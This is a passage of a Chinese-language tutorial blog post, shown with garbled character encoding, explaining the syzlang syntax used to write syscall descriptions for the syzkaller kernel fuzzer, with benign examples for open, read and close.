title="I.å‚æ•°ï¼ˆargï¼‰ä¸å‚æ•°åï¼ˆargnameï¼‰"></a>I.å‚æ•°ï¼ˆargï¼‰ä¸å‚æ•°åï¼ˆargnameï¼‰</h3><p>æˆ‘ä»¬è¾“å…¥ç»™ç³»ç»Ÿè°ƒç”¨æ¨¡æ¿çš„ <code>å‚æ•° ï¼ˆargï¼‰</code> åº”å½“ä¸ºå¦‚ä¸‹å½¢å¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arg = argname type</span><br></pre></td></tr></table></figure><p>å³ä¸€ä¸ªå‚æ•°ç”± <code>å‚æ•°å ï¼ˆargnameï¼‰  </code> ä¸ <code>ç±»å‹ï¼ˆtypeï¼‰</code> ç»„æˆ</p><p>å…¶ä¸­ï¼Œå‚æ•°åä¾¿æ˜¯ <code>æ ‡è¯†ç¬¦ï¼ˆidentifierï¼‰</code></p><h4 id="example"><a href="#example" class="headerlink" title="example"></a>example</h4><p>è¿™ä¹ˆè®²æœ‰äº›ç©ºæ³›ï¼Œæˆ‘ä»¬æ¥ç®€å•çœ‹ä¸€ä¸ªä¾‹å­ï¼Œåœ¨ Linux ä¸­ç³»ç»Ÿè°ƒç”¨ <code>read</code> çš„å£°æ˜ï¼ˆå…¶å®æ˜¯å®šä¹‰ï¼‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(read, <span class="type">unsigned</span> <span class="type">int</span>, fd, <span class="type">char</span> __user *, buf, <span class="type">size_t</span>, count)</span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬ä½¿ç”¨ libc çš„ wrapper è¿›è¡Œ read ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œå½¢å¼å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> my_file_fd = open(<span class="string">&quot;/dev/a3dev&quot;</span>, O_RDONLY);</span><br><span class="line"><span class="type">char</span> my_buf[<span class="number">114514</span>];</span><br><span class="line"><span class="type">size_t</span>my_count = <span class="number">114514</span>;</span><br><span class="line">read(my_file_fd, my_buf, my_count);</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­å½“ä¸­ï¼Œ<code>fdã€bufã€count</code> ä¾¿æ˜¯ <strong>argname</strong>ï¼Œ<code>my_file_fdã€my_bufã€my_count</code> ä¾¿æ˜¯ <strong>type</strong></p><p>é‚£ä¹ˆï¼Œåœ¨æˆ‘ä»¬ä½¿ç”¨ syzlang ç¼–å†™ç³»ç»Ÿè°ƒç”¨æ¨¡æ¿æ—¶ï¼Œä¾‹å¦‚ read çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬åº”è¯¥å†™æˆä¸‹é¢è¿™ä¸ªæ ·å­ï¼ˆå‡è®¾ my_file_fd å·²å®šä¹‰ä¸ºä¸€ä¸ª <code>resources</code>ï¼ˆåé¢ä¼šè®²ï¼‰ï¼‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fd my_file_fd</span><br></pre></td></tr></table></figure><h3 id="II-ç±»å‹ï¼ˆtypeï¼‰"><a href="#II-ç±»å‹ï¼ˆtypeï¼‰" class="headerlink" title="II.ç±»å‹ï¼ˆtypeï¼‰"></a>II.ç±»å‹ï¼ˆtypeï¼‰</h3><blockquote><p>å…¶å®è¿™ä¹ˆç¿»è¯‘ç¬”è€…è§‰å¾—å¥½åƒä¸å¤§å‡†ç¡®ï¼Œä¸è¿‡ç¬”è€…è‹±æ–‡ä¸å¤§è¡Œæ‰€ä»¥è¿™é‡Œæš‚ä¸”ç›´è¯‘â€¦</p></blockquote><p>å‰é¢æˆ‘ä»¬è®²åˆ°ä¸€ä¸ª <code>arg</code> ç”± ä¸€ä¸ª <code>argname </code>ä¸ <code>type</code> ç»„æˆï¼Œargname æˆ‘ä»¬å·²ç»è®²äº†ï¼Œç°åœ¨æˆ‘ä»¬æ¥è®² type</p><p>type çš„å®šä¹‰åŒæ ·ç”±ä¸¤éƒ¨åˆ†ç»„æˆâ€”â€”<code>ç±»å‹åï¼ˆtypenameï¼‰</code> ä¸ <code>ç±»å‹é€‰é¡¹ï¼ˆtype-optionsï¼‰</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type = typename [ &quot;[&quot; type-options &quot;]&quot; ]</span><br></pre></td></tr></table></figure><h4 id="ç±»å‹åï¼ˆtypenameï¼‰"><a href="#ç±»å‹åï¼ˆtypenameï¼‰" class="headerlink" title="ç±»å‹åï¼ˆtypenameï¼‰"></a>ç±»å‹åï¼ˆtypenameï¼‰</h4><p>å³è¯¥ type çš„ç±»å‹ï¼Œä¾‹å¦‚ C å½“ä¸­çš„intã€charã€void ç­‰ç­‰</p><p>å¸¸è§„é€‰é¡¹åŒ…æ‹¬ï¼š</p><ul><li><strong>opt</strong>ï¼šè¿™æ˜¯ä¸€ä¸ªå¯é€‰å‚æ•°ï¼ˆä¾‹å¦‚ mmap çš„ fdï¼‰</li></ul><p>å…¶ä½™ type-options æ˜¯åŸºäºç‰¹å®š type çš„ï¼Œå¦‚ä¸‹ï¼š</p><ul><li><p><strong>const</strong>ï¼šæ•´å‹å¸¸æ•°</p><ul><li>ç±»å‹é€‰é¡¹ï¼š<ul><li>å€¼ï¼ˆvalueï¼‰ï¼šä¾‹å¦‚ <code>0</code></li><li>åŸºç¡€ç±»å‹ï¼ˆunderlying typeï¼‰ï¼š<code>intN</code> æˆ– <code>intptr</code> ä¹‹ä¸€</li></ul></li></ul></li><li><p><strong>intN</strong> æˆ– <strong>intptr</strong>ï¼šä¸€ä¸ªæœ‰ç€ç‰¹æ®Šå«ä¹‰çš„æ•´å‹ï¼Œä¸‹æ–‡ä¼šè¿›è¡Œè¯¦ç»†è¯´æ˜</p><ul><li>ç±»å‹é€‰é¡¹ï¼š<ul><li>å¯é€‰èŒƒå›´åŒºé—´ï¼šä¾‹å¦‚ <code>&quot;1:100&quot;</code> è¡¨ç¤ºå–å€¼å€¼çš„åŒºé—´ä¸º <code>[1, 100]</code></li><li>å¯é€‰å‚æ•°</li></ul></li></ul></li><li><p><strong>flags</strong>ï¼šå€¼çš„é›†åˆ</p><ul><li>ç±»å‹é€‰é¡¹ï¼š<ul><li>å¯¹ flags æè¿°çš„å¼•ç”¨</li><li>åŸºç¡€æ•´å‹ç±»å‹ï¼šä¾‹å¦‚ <code>int32</code></li></ul></li></ul></li><li><p><strong>array</strong>ï¼šä¸€ä¸ªå¯å˜é•¿&#x2F;å›ºå®šé•¿åº¦çš„æ•°ç»„</p><ul><li>ç±»å‹é€‰é¡¹ï¼š<ul><li>å…ƒç´ çš„ type</li><li>å¯é€‰é•¿åº¦åŒºé—´ï¼šä¾‹å¦‚å›ºå®šé•¿åº¦ <code>&quot;5&quot;</code> æˆ–è€…é•¿åº¦èŒƒå›´ <code>&quot;5:10&quot;</code>ï¼ˆåŒ…æ‹¬è¾¹ç•Œï¼‰</li></ul></li></ul></li><li><p><strong>ptr</strong> æˆ– <strong>ptr64</strong>ï¼šæŒ‡å‘ä¸€ä¸ªå¯¹è±¡çš„æŒ‡é’ˆ</p><ul><li>ç±»å‹é€‰é¡¹ï¼š<ul><li>æ–¹å‘ï¼š<code>in</code> æˆ– <code>out</code> æˆ– <code>inout</code></li><li>å¯¹è±¡çš„ type</li></ul></li><li>æ— è®ºå¯¹è±¡æŒ‡é’ˆå¤§å°å¦‚ä½•ï¼Œptr64 æ°¸è¿œä¸º 8 å­—èŠ‚</li></ul></li><li><p><strong>string</strong>ï¼šä¸€å—æœ‰ç€ 0 ç»ˆæ­¢ç¬¦çš„å†…å­˜ç¼“å†²åŒº</p><ul><li>ç±»å‹é€‰é¡¹ï¼š<ul><li>å¸¸é‡å­—ç¬¦ä¸²&#x2F;å¯¹å­—ç¬¦ä¸²çš„å¼•ç”¨<ul><li>å‰è€…ï¼šä¾‹å¦‚ <code>&quot;foo&quot;</code>ä½œä¸ºå¸¸è§„å­—ç¬¦ä¸²è¿›è¡Œè§£æï¼Œæˆ–è€…`deadbeef`ä½œä¸º4ä¸ª 16 è¿›åˆ¶å­—èŠ‚è¿›è¡Œè§£æ</li><li>åè€…ï¼šè‹¥æ˜¯ç‰¹æ®Šç±»å‹ <code>filename</code> åˆ™ä¼š<strong>ç”Ÿæˆ</strong>æ–‡ä»¶å</li></ul></li></ul></li></ul></li><li><p><strong>stringnoz</strong>ï¼šä¸€å—<strong>æ²¡æœ‰</strong> 0 ç»ˆæ­¢ç¬¦çš„å†…å­˜ç¼“å†²åŒº</p><ul><li>ç±»å‹é€‰é¡¹ï¼šï¼ˆåŒ <code>string</code>)</li></ul></li><li><p><strong>glob</strong>ï¼šåŒ¹é…ç›®æ ‡æ–‡ä»¶çš„ globï¼ˆï¼Ÿï¼‰æ¨¡å¼</p><ul><li>ç±»å‹é€‰é¡¹ï¼š<ul><li>ç”¨å¼•å·åŒ…è£¹ç€çš„æ¨¡å¼å­—ç¬¦ä¸²ï¼šä¾‹å¦‚ <code>&quot;/sys/&quot;</code> æˆ– <code>&quot;/sys/**/*/&quot;</code>ï¼Œå…·ä½“ç”¨æ³•å‚è§<a href="https://pkg.go.dev/path/filepath#Match">https://pkg.go.dev/path/filepath#Match</a></li></ul></li></ul></li><li><p><strong>fmt</strong>ï¼šä¸€ä¸ªè¡¨ç¤ºä¸€ä¸ªæ•´æ•°çš„å­—ç¬¦ä¸²</p><ul><li>ç±»å‹é€‰é¡¹ï¼š<ul><li>æ ¼å¼ä¸å€¼ï¼šå‰è€…å¯å–å€¼ä¸º <code>dec</code>æˆ–  <code>hex</code> æˆ– <code>oct</code>ï¼›åè€…å¯ä»¥æ˜¯ä¸€ä¸ª resourceã€intã€flagsã€const æˆ– proc</li></ul></li><li>æœ€ç»ˆçš„ç»“æœé€šå¸¸æ˜¯å›ºå®šå°ºå¯¸çš„</li></ul></li><li><p><strong>len</strong>ï¼šå¦ä¸€ä¸ª <code> å­—æ®µ</code> çš„é•¿åº¦ï¼ˆå¯¹äº array è€Œè¨€ä¸ºå…ƒç´ çš„æ•°é‡ï¼‰</p><ul><li>ç±»å‹é€‰é¡¹ï¼š<ul><li>å¯¹è±¡çš„ argname</li></ul></li></ul></li><li><p><strong>bytesize</strong>ï¼šä¸ len ç±»ä¼¼ï¼Œä¸è¿‡å•ä½æ˜¯<strong>å­—èŠ‚</strong></p><ul><li>ç±»å‹é€‰é¡¹ï¼š<ul><li>å¯¹è±¡çš„ argname</li></ul></li></ul></li><li><p><strong>bitsize</strong>ï¼šä¸ len ç±»å‹ï¼Œä¸è¿‡å•ä½æ˜¯<strong>æ¯”ç‰¹ä½</strong></p><ul><li>ç±»å‹é€‰é¡¹ï¼š<ul><li>å¯¹è±¡çš„ argname</li></ul></li></ul></li><li><p><strong>offsetof</strong>ï¼šä¸€ä¸ª <code>å­—æ®µ</code> åœ¨å…¶ parent struct  ä¸­çš„åç§»ï¼ˆç¬”è€…æ€ä¹ˆè¯‘éƒ½æ²¡é‚£æ„Ÿè§‰ï¼Œæ•…ä¿ç•™åŸè¯ï¼‰</p><ul><li>ç±»å‹é€‰é¡¹ï¼š<ul><li><code>å­—æ®µ</code></li></ul></li></ul></li><li><p><strong>vma</strong> æˆ– <strong>vma64</strong>ï¼šæŒ‡å‘ä¸€ç»„é¡µçš„æŒ‡é’ˆï¼ˆç”¨ä½œ mmap&#x2F;munmap&#x2F;mremap&#x2F;madvise çš„è¾“å…¥ï¼‰</p><ul><li>ç±»å‹é€‰é¡¹ï¼š<ul><li>ï¼ˆå¯é€‰ï¼‰é¡µçš„æ•°é‡æˆ–é¡µçš„èŒƒå›´ï¼šå‰è€…ä¾‹å¦‚ <code>vma[7]</code>ï¼Œåè€…ä¾‹å¦‚ <code>vma[2-4]</code></li></ul></li><li>vma64 çš„é•¿åº¦æ’ä¸º 8 å­—èŠ‚</li></ul></li><li><p><strong>proc</strong>ï¼šå•ä¸ªè¿›ç¨‹çš„æ•´å‹ï¼ˆè¯¦è§ä¸‹é¢çš„æè¿°ï¼‰</p><ul><li>ç±»å‹é€‰é¡¹ï¼š<ul><li>å€¼çš„åŒºé—´çš„èµ·å§‹</li><li>æ¯ä¸ªè¿›ç¨‹çš„å€¼çš„æ•°é‡</li><li>åŸºç¡€ç±»å‹</li></ul></li></ul></li><li><p><strong>text</strong>ï¼šç‰¹å®š type çš„æœºå™¨ç </p><ul><li>ç±»å‹é€‰é¡¹ï¼š<ul><li>ä»£ç ç±»å‹ï¼š<code>x86_real</code>, <code>x86_16</code>, <code>x86_32</code>, <code>x86_64</code>, <code>arm64</code></li></ul></li></ul></li><li><p><strong>void</strong>ï¼štype with static size 0ï¼ˆè‡ªå·±ä½“ä¼šï¼Œæ€ä¹ˆè¯‘éƒ½æ²¡é‚£ç§æ„Ÿè§‰â€¦ï¼‰</p><ul><li>é€šå¸¸åœ¨æ¨¡æ¿ä»¥åŠå¯å˜é•¿ï¼ˆvarlenï¼‰è”åˆä½“ä¸­ä½¿ç”¨ï¼Œ<strong>ä¸èƒ½ç”¨ä½œç³»ç»Ÿè°ƒç”¨çš„å‚æ•°</strong></li></ul></li></ul><p>åœ¨ <code>ç»“æ„ä½“/è”åˆä½“/æŒ‡é’ˆ</code> ä¸­ä½¿ç”¨æ—¶ï¼Œ<code>flags/len/flags</code> çš„æ„æˆä¸­å°¾éƒ¨è¿˜å¯ä»¥è·Ÿç€ type type-options</p><blockquote><p><del>å”‰å‘€ä½ è¯´äº†è¿™ä¹ˆå¤šè°å¬å¾—æ‡‚å•Šï¼Œè¿˜æ˜¯å¿«æŠŠğŸŒ°æ¬ä¸Šæ¥å§</del></p></blockquote><h5 id="å…³äº-flags-çš„è¡¥å……è¯´æ˜"><a href="#å…³äº-flags-çš„è¡¥å……è¯´æ˜" class="headerlink" title="å…³äº flags çš„è¡¥å……è¯´æ˜"></a>å…³äº <em>flags</em> çš„è¡¥å……è¯´æ˜</h5><p>flags é€šå¸¸å…·æœ‰å¦‚ä¸‹å½¢å¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagname = const [&quot;,&quot; const]*</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">my_flags = 1,2,3,4,5,6,7,8,9,0</span><br></pre></td></tr></table></figure><p>å¯¹äº string ç±»å‹çš„ flagï¼Œå…¶åº”å½“å…·æœ‰å¦‚ä¸‹å½¢å¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagname = &quot;\&quot;&quot; literal &quot;\&quot;&quot; [&quot;,&quot; &quot;\&quot;&quot; literal &quot;\&quot;&quot;]*</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">my_str_flags = &quot;arttnba3&quot;, &quot;arttnba4&quot;, &quot;arttnba5&quot;</span><br></pre></td></tr></table></figure><h4 id="ç±»å‹é€‰é¡¹ï¼ˆtype-optionsï¼‰"><a href="#ç±»å‹é€‰é¡¹ï¼ˆtype-optionsï¼‰" class="headerlink" title="ç±»å‹é€‰é¡¹ï¼ˆtype-optionsï¼‰"></a>ç±»å‹é€‰é¡¹ï¼ˆtype-optionsï¼‰</h4><blockquote><p>åœ¨ç±»å‹å½“ä¸­ï¼Œç±»å‹é€‰é¡¹å…¶å®ä¹Ÿæ˜¯å¯é€‰é¡¹ï¼ˆ<del>åˆæè¿™ç»•å£ä»¤äº†</del>ï¼‰</p></blockquote><p>type-options åœ¨ç¬”è€…çš„ç†è§£ä¸­ä¸º<strong>å¯¹ä¸€ä¸ªç‰¹å®š type çš„è¡¥å……è¯´æ˜</strong>ï¼Œå…¶åº”å½“å…·æœ‰å¦‚ä¸‹å½¢å¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type-options = [type-opt [&quot;,&quot; type-opt]]</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸éš¾çœ‹å‡º type-options åœ¨ syzlang ä¸­ä¸º<strong>å¯é€‰é¡¹</strong>ï¼ŒåŒæ ·åœ°ï¼Œå¯¹äºä¸€ä¸ª type å…¶å¯ä»¥æœ‰å¤šä¸ª type-options</p><p>æŸ¥çœ‹å‰é¢ type çš„å½¢å¼è¯´æ˜å¯çŸ¥ï¼Œåœ¨ä½¿ç”¨ç±»å‹é€‰é¡¹æ—¶ï¼Œæˆ‘ä»¬åº”å½“ä½¿ç”¨ <code>[]</code> å°†ä¹‹åŒ…è£¹</p><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ğŸŒ°ï¼ˆä½œä¸ºç³»ç»Ÿè°ƒç”¨å‚æ•°è¾“å…¥ï¼Œè€Œéå•ç‹¬çš„å‚æ•°å®šä¹‰ï¼‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flags flags[open_flags]</span><br></pre></td></tr></table></figure><p>ä»å·¦å‘å³è§£æï¼šå¯¹äºè¿™ä¸ªç³»ç»Ÿè°ƒç”¨çš„ <code>flags</code> å‚æ•°ï¼Œæˆ‘ä»¬çš„è¾“å…¥æ˜¯ä¸€ä¸ª flags ç±»å‹ï¼Œå…¶ç±»å‹é€‰é¡¹ä¸ºå¯¹ä¸€ä¸ª flags æè¿° <code>open_flags</code> çš„å¼•ç”¨ï¼Œæ„ä¸ºå–å€¼ä¸º open_flags ä¸­ä¹‹ä¸€</p><p>å…¶ä¸­ open_flags è¢«å®šä¹‰å¦‚ä¸‹ï¼Œè¿™äº›å€¼é€šè¿‡ include è¯­å¥ä»å†…æ ¸æºæ–‡ä»¶ä¸­è¢«åŒ…å«è¿›æ¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open_flags = O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE</span><br></pre></td></tr></table></figure><h3 id="III-ç³»ç»Ÿè°ƒç”¨æ¨¡æ¿"><a href="#III-ç³»ç»Ÿè°ƒç”¨æ¨¡æ¿" class="headerlink" title="III.ç³»ç»Ÿè°ƒç”¨æ¨¡æ¿"></a>III.ç³»ç»Ÿè°ƒç”¨æ¨¡æ¿</h3><p>æˆ‘ä»¬å°†ä¸Šé¢çš„ç»“æœè¿›è¡Œæ•´åˆï¼Œä¸€ä¸ªç³»ç»Ÿè°ƒç”¨çš„å½¢å¼åº”å½“å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syscallname &quot;(&quot; [arg [&quot;,&quot; arg]*] &quot;)&quot; [type] [&quot;(&quot; attribute* &quot;)&quot;]</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ç¬”è€…é€šè¿‡ä¸€ä¸ªğŸŒ°è¿›è¡Œåˆ†è§£è¯´æ˜</p><h4 id="åŸºæœ¬å½¢å¼"><a href="#åŸºæœ¬å½¢å¼" class="headerlink" title="åŸºæœ¬å½¢å¼"></a>åŸºæœ¬å½¢å¼</h4><p>æˆ‘ä»¬å°†å…¶æœ€å°åŒ–ï¼Œæˆ‘ä»¬åº”å½“ä¹¦å†™ä¸ºå¦‚ä¸‹å½¢å¼ï¼Œç±»ä¼¼äºå¸¸è§„çš„ C è¯­è¨€å‡½æ•°è°ƒç”¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syscallname(arg)</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚å¯¹äº open è¿™ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œæˆ‘ä»¬å¯ä»¥å†™æˆè¿™ä¸ªæ ·å­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">open(file ptr[in, filename], flags flags[open_flags], mode flags[open_mode])</span><br><span class="line">#...</span><br><span class="line">open_flags = O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE</span><br><span class="line">open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH</span><br></pre></td></tr></table></figure><p>å¯¹äº open ç³»ç»Ÿè°ƒç”¨çš„ä¸‰ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬ç»™äº†è¿™æ ·çš„è¾“å…¥ï¼š</p><ul><li>file å‚æ•°ï¼šä¸€ä¸ª<strong>æŒ‡é’ˆ</strong>ç±»å‹ï¼Œå…¶ type-opetions çš„ç¬¬ä¸€ä¸ªä¸º <code>in</code>ï¼Œæ„ä¸ºç”±è¯¥æŒ‡é’ˆæŒ‡å‘ç‰¹å®šå¯¹è±¡ï¼Œç¬¬äºŒä¸ªä¸º <code>filename</code>ï¼Œä¸º<strong>ç‰¹æ®Šçš„ string å¯¹è±¡</strong>ï¼Œå¯¹äº filenameï¼Œsyzlang ä¼šè¿›è¡Œæ–‡ä»¶ç”Ÿæˆï¼Œå°†æ–‡ä»¶åä½œä¸ºè¾“å…¥</li><li>flags å‚æ•°ï¼šä¸€ä¸ª <strong>flags</strong> ç±»å‹ï¼Œå…¶ type-options ä¸º <code>open_flags</code> ï¼Œæ„ä¸ºä»æˆ‘ä»¬å®šä¹‰çš„ flagsâ€”â€”<code>open_flags</code> ä¸­å–å€¼</li><li>mode å‚æ•°ï¼šä¸€ä¸ª <strong>flags</strong> ç±»å‹ï¼Œå…¶ type-options ä¸º <code>open_mode</code> ï¼Œæ„ä¸ºä»æˆ‘ä»¬å®šä¹‰çš„ flagsâ€”â€”<code>open_mode</code> ä¸­å–å€¼</li></ul><h4 id="è¿”å›å€¼"><a href="#è¿”å›å€¼" class="headerlink" title="è¿”å›å€¼"></a>è¿”å›å€¼</h4><p>æ¥ä¸‹æ¥æˆ‘ä»¬å†ç»§ç»­æ·±å…¥ï¼Œç³»ç»Ÿè°ƒç”¨é€šå¸¸éƒ½æœ‰è¿”å›å€¼ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©æ¥æ”¶ä¹Ÿå¯ä»¥é€‰æ‹©å¿½è§†ï¼Œè‹¥æ˜¯æˆ‘ä»¬éœ€è¦è¿›è¡Œæ¥æ”¶ï¼Œåˆ™åº”å½“åœ¨ç³»ç»Ÿè°ƒç”¨çš„æœ«å°¾æ·»åŠ  type ï¼Œä¾‹å¦‚ open è¿™ä¸ªç³»ç»Ÿè°ƒç”¨ä¼šè¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œæˆ‘ä»¬ç°åœ¨æƒ³å°†å…¶è¿”å›çš„æ–‡ä»¶æè¿°ç¬¦å­˜åˆ°ä¸€ä¸ªå˜é‡æ¯”å¦‚è¯´ <code>a3fd</code>ï¼ˆå‡å¦‚å·²è¢«å£°æ˜ä¸º _èµ„æº_ï¼ˆä¸‹æ–‡è§£é‡Šï¼‰ï¼‰ å½“ä¸­ï¼Œæˆ‘ä»¬åº”å½“å†™æˆä¸‹é¢è¿™ä¸ªå½¢å¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(file ptr[in, filename], flags flags[open_flags], mode flags[open_mode]) a3fd</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆ open çš„è¿”å›å€¼ä¾¿è¢«å­˜å‚¨åˆ°äº† <code>a3fd</code> è¿™ä¸€ä¸ª type å½“ä¸­ï¼Œæˆ‘ä»¬åœ¨åç»­ä¾¿å¯ä»¥å°† fd ç”¨ä½œå…¶ä»–ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">close(fd a3fd)</span><br></pre></td></tr></table></figure><h4 id="call-attributes"><a href="#call-attributes" class="headerlink" title="call attributes"></a>call attributes</h4><p>ç³»ç»Ÿè°ƒç”¨æ¨¡æ¿å½“ä¸­è¿˜æœ‰ä¸€ä¸ªå¯é€‰é¡¹æ˜¯ <code>attributes</code>ï¼Œå³è¿™ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨çš„<strong>å±æ€§</strong>ï¼Œå¯ä»¥å–çš„å€¼å¦‚ä¸‹ï¼š</p><ul><li><code>disabled</code>ï¼šè¯¥ç³»ç»Ÿè°ƒç”¨å°†ä¸ç”¨äº fuzzingï¼›è¿™ä¸ªå±æ€§é€šå¸¸ç”¨äºä¸´æ—¶ç¦ç”¨æŸäº›ç³»ç»Ÿè°ƒç”¨ï¼Œæˆ–è€…ç¦ç”¨ç‰¹å®šçš„å‚æ•°ç»„åˆ</li><li><code>timeout[N]</code>ï¼šç³»ç»Ÿè°ƒç”¨åœ¨é»˜è®¤å€¼ä»¥å¤–çš„é¢å¤–çš„è¶…æ—¶æ—¶é—´ï¼Œå•ä½ä¸ºæ¯«ç§’ï¼ˆmsï¼‰</li><li><code>prog_timeoout[N]</code>ï¼šè‹¥ä¸€ä¸ªç¨‹åºåŒ…å«äº†è¯¥ç³»ç»Ÿè°ƒç”¨ï¼Œåˆ™è¯¥å±æ€§ä¸ºæ•´ä¸ªç¨‹åºçš„æ‰§è¡Œçš„è¶…æ—¶æ—¶é—´ï¼Œè‹¥å­˜åœ¨å¤šä¸ªå®šä¹‰äº†è¯¥å±æ€§çš„ç³»ç»Ÿè°ƒç”¨åˆ™å–æœ€å¤§å€¼</li><li><code>ignore_return</code>ï¼šåœ¨å›é€€åé¦ˆï¼ˆç¬”è€…æ¨æŒ‡çš„æ˜¯ syzkaller çš„ fuzz æœºåˆ¶ä¹‹ä¸€ï¼Œæ ¹æ®è¿”å›å€¼åˆ¤æ–­è·¯å¾„è¦†ç›–ä¹‹ç±»çš„ï¼‰ä¸­å¿½è§†è¿™ä¸ªç³»ç»Ÿè°ƒç”¨çš„è¿”å›å€¼ï¼›ç”¨äºä¸è¿”å›å›ºå®šçš„é”™è¯¯ç ï¼ˆä¾‹å¦‚ -EFAULTï¼‰è€Œæ˜¯è¿”å›å…¶ä»–å€¼çš„ç³»ç»Ÿè°ƒç”¨</li><li><code>break_returns</code>ï¼šå¿½ç•¥å›é€€åé¦ˆä¸­ç¨‹åºä¸­æ‰€æœ‰åç»­ç³»ç»Ÿè°ƒç”¨çš„è¿”å›å€¼ï¼ˆæ–‡æ¡£ä¸­è¯´ <code>can&#39;t be trusted</code>ï¼Œç¬”è€…æš‚æ—¶ä¸ç†è§£â€¦ï¼‰</li></ul><h4 id="å˜ç§ï¼ˆvariantsï¼‰"><a href="#å˜ç§ï¼ˆvariantsï¼‰" class="headerlink" title="å˜ç§ï¼ˆvariantsï¼‰"></a>å˜ç§ï¼ˆvariantsï¼‰</h4><p>å¯¹äºç³»ç»Ÿè°ƒç”¨çš„å˜ç§å½¢å¼ï¼Œæˆ‘ä»¬åº”å½“åœ¨ç³»ç»Ÿè°ƒç”¨ååé¢ä½¿ç”¨ <code>$</code> ç¬¦å·è¿›è¡Œé¢å¤–çš„æŒ‡å®š</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open$dir(file ptr[in, filename], flags flags[open_flags], mode flags[open_mode]) fd_dir</span><br></pre></td></tr></table></figure><blockquote><p>æŒ‰ç¬”è€…çš„ç†è§£åº”è¯¥æ˜¯ä¸ºå…¶å–ä¸€ä¸ªåˆ«åï¼Ÿæ¯”å¦‚è¯´å¯¹äº syzkaller è€Œè¨€ <code>open$dir</code> å’Œ <code>open$a3dir</code> å°±æ˜¯ä¸¤ä¸ªä¸œè¥¿ï¼Œè€Œè‹¥æ˜¯åœ¨ä¸¤ä¸ªä¸åŒçš„æ–‡ä»¶ä¸­éƒ½å‡ºç°äº† <code>open$dir</code> åˆ™ä¼šåœ¨_é‡ç¼–è¯‘_ï¼ˆä¸‹æ–‡è§£é‡Šï¼‰æ—¶å‘ç”Ÿå†²çª</p></blockquote><h3 id="IV-æ•´å‹ï¼ˆintegerï¼‰"><a href="#IV-æ•´å‹ï¼ˆintegerï¼‰" 